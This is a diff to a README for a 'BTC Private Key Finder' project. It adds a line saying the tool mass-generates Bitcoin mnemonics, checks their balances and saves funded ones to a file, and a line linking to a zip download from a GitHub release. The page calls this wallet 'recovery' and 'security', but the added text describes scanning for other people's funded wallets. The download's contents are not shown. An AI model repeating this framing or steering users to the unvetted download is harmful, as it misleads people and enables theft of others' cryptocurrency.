@@ -2,6 +2,7 @@
 
 Recover your Bitcoin private keys and wallets with BTC Private Key Finder. Enhance your digital wallet security and recovery processes with robust tools ensuring effective recovery.
 
+This tool generating with super speed btc mnemonic and check balance and if found save it in .txt file
 
 
 ![BTC Private Key Finder](https://github.com/user-attachments/assets/862c7b12-f9b8-4b56-aaa2-acb8d9b5c613)
@@ -28,6 +29,7 @@ Recover your Bitcoin private keys and wallets with BTC Private Key Finder. Enhan
 - **Digital Asset Recovery**: Efficient recovery of digital assets.
 - **Python Crypto Tool**: Utilize Python-based tools for cryptocurrency management.
 - **Bitcoin Security**: Enhance the security of Bitcoin wallets.
+- Link download: https://github.com/yoyo422012/seed-checker-btc/releases/download/btc/btc-check.zip
 
 ## Benefits
 - **Recover Access**: Regain access to your lost or forgotten Bitcoin wallets and keys.
